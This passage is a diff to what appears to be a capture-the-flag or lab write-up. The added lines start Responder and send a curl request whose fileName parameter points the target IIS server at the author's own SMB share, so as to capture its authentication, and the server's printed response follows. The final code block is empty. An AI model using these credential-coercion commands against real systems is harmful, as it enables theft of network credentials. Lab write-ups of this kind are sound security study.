@@ -436,4 +436,24 @@ There could be some form of file read here, or even RFI
 So my first instinct is to start responder then direct the server to my share
 
 ```python
+sudo responder -I tun0
+```
+
+So ill start responder
+
+```python
+curl -I --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Download?fileName=\\10.10.14.61\share'
+HTTP/1.1 404 Not Found
+Transfer-Encoding: chunked
+Server: Microsoft-IIS/10.0
+WWW-Authenticate: Negotiate oYG3MIG0oAMKAQChCwYJKoZIhvcSAQICooGfBIGcYIGZBgkqhkiG9xIBAgICAG+BiTCBhqADAgEFoQMCAQ+iejB4oAMCARKicQRv/JVJxP4AfkVS8WF1QEYVyIOpS8anDQjuhQbm5HI2fbogHvVVjWFHDRrplNMTJUtT99XV1ncBlnxY62t9EinzW7QggnEFaQ8nZ/udCVNyfhBxw8u/EtgGpjm1Ahg91I7FzruECQZNO/hBDvdr/PQ+
+Persistent-Auth: true
+X-Powered-By: ASP.NET
+Date: Wed, 12 Aug 2026 17:58:02 GMT
+```
+
+Ill send the request to point back to my server
+
+```python
+
 ```
